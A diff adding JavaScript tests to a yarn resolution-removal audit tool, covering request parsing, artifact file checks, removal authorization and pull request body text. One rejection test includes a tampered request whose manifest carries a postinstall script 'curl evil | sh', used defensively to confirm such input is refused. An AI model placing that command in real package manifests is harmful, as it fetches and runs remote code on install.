@@ -5,7 +5,10 @@ import { AuditPolicyError } from "./npm-audit-policy.mjs";
 import {
   applyRemoval,
   assertProbeTargetsInLockfile,
+  assertRemovalArtifactFiles,
+  authorizeRemoval,
   checkSync,
+  parseRemovalRequest,
   classifyProbe,
   evaluateStaleness,
   parseNonSecurityResolutions,
@@ -590,6 +593,150 @@ test("removal pull request body satisfies the PR policy and names each resolutio
   assert.match(body, /ADR-0015/);
   // PR Policy Check の Issue リンク規約: (close[sd]?|fix(e[sd])?|refs?) #[0-9]+
   assert.match(body, /^Refs #291$/m);
+});
+
+test("removal pull request body tells the reviewer to run yarn install when the lockfile changes", () => {
+  const changes = renderRemovalPullRequestBody(
+    [{ entry: probedEntry(), resolution: "npm:11.8.2" }],
+    { lockfileChanges: true },
+  );
+  assert.match(changes, /\[!IMPORTANT\]/);
+  assert.match(changes, /`backstage\/` で `yarn install` を実行して lock をコミットする/);
+
+  const noChanges = renderRemovalPullRequestBody([
+    { entry: probedEntry(), resolution: "npm:11.8.2" },
+  ]);
+  assert.doesNotMatch(noChanges, /\[!IMPORTANT\]/);
+  assert.match(noChanges, /`backstage\/yarn.lock` は変わらない/);
+  assert.match(noChanges, /`backstage\/yarn.lock` は変更しない/);
+});
+
+test("parses a canonical removal request", () => {
+  assert.deepEqual(
+    parseRemovalRequest(
+      JSON.stringify({ patterns: ["@yarnpkg/core/got"], lockfileChanges: false }),
+    ),
+    { patterns: ["@yarnpkg/core/got"], lockfileChanges: false },
+  );
+});
+
+test("rejects a tampered or malformed removal request", async (t) => {
+  const invalidCases = [
+    { name: "invalid JSON", raw: "{", message: /must be valid JSON/ },
+    { name: "non-object", raw: "[]", message: /must be a JSON object/ },
+    {
+      name: "extra field carrying a manifest",
+      raw: JSON.stringify({
+        patterns: ["@yarnpkg/core/got"],
+        lockfileChanges: false,
+        manifest: { scripts: { postinstall: "curl evil | sh" } },
+      }),
+      message: /exactly patterns and lockfileChanges/,
+    },
+    {
+      name: "missing lockfileChanges",
+      raw: JSON.stringify({ patterns: ["@yarnpkg/core/got"] }),
+      message: /exactly patterns and lockfileChanges/,
+    },
+    {
+      name: "empty patterns",
+      raw: JSON.stringify({ patterns: [], lockfileChanges: false }),
+      message: /non-empty array of resolution keys/,
+    },
+    {
+      name: "non-string pattern",
+      raw: JSON.stringify({ patterns: [{}], lockfileChanges: false }),
+      message: /non-empty array of resolution keys/,
+    },
+    {
+      name: "duplicate patterns",
+      raw: JSON.stringify({
+        patterns: ["@yarnpkg/core/got", "@yarnpkg/core/got"],
+        lockfileChanges: false,
+      }),
+      message: /contains duplicates/,
+    },
+    {
+      name: "non-boolean lockfileChanges",
+      raw: JSON.stringify({ patterns: ["@yarnpkg/core/got"], lockfileChanges: "no" }),
+      message: /lockfileChanges must be a boolean/,
+    },
+  ];
+
+  for (const invalidCase of invalidCases) {
+    await t.test(invalidCase.name, () => {
+      assert.throws(
+        () => parseRemovalRequest(invalidCase.raw),
+        (error) =>
+          error instanceof AuditPolicyError && invalidCase.message.test(error.message),
+      );
+    });
+  }
+});
+
+test("accepts an artifact that contains only removal.json", () => {
+  assert.doesNotThrow(() => assertRemovalArtifactFiles(["removal.json"]));
+});
+
+test("rejects an artifact that carries any other file", () => {
+  for (const files of [
+    [],
+    ["removal.json", "package.json"],
+    ["removal.json", "yarn.lock"],
+    ["pull-request-body.md"],
+  ]) {
+    assert.throws(
+      () => assertRemovalArtifactFiles(files),
+      (error) =>
+        error instanceof AuditPolicyError &&
+        /must contain only removal.json/.test(error.message),
+      `files ${JSON.stringify(files)} should be rejected`,
+    );
+  }
+});
+
+test("authorizes only probed declarations that exist in package.json", () => {
+  const nonSecurity = [nonSecurityEntry(), probedEntry()];
+  const resolutions = { "@types/react": "^18", "@yarnpkg/core/got": "npm:11.8.2" };
+
+  const authorized = authorizeRemoval(
+    { patterns: ["@yarnpkg/core/got"], lockfileChanges: false },
+    nonSecurity,
+    resolutions,
+  );
+  assert.deepEqual(authorized, [{ entry: probedEntry(), resolution: "npm:11.8.2" }]);
+
+  const rejected = [
+    {
+      name: "pattern without probe",
+      patterns: ["@types/react"],
+      message: /has no probe .*; refusing to remove it/,
+    },
+    {
+      name: "pattern not declared anywhere",
+      patterns: ["undici@npm:7.28.0"],
+      message: /is not declared in yarn-resolutions-non-security.json; refusing to remove it/,
+    },
+    {
+      name: "declared but missing from package.json",
+      patterns: ["prettier@npm:^3.9.6"],
+      nonSecurity: [...nonSecurity, probedEntry({ pattern: "prettier@npm:^3.9.6" })],
+      message: /is not present in package.json resolutions; refusing to remove it/,
+    },
+  ];
+  for (const testCase of rejected) {
+    assert.throws(
+      () =>
+        authorizeRemoval(
+          { patterns: testCase.patterns, lockfileChanges: false },
+          testCase.nonSecurity ?? nonSecurity,
+          resolutions,
+        ),
+      (error) =>
+        error instanceof AuditPolicyError && testCase.message.test(error.message),
+      testCase.name,
+    );
+  }
 });
 
 test("removal pull request body omits the run line without run metadata", () => {
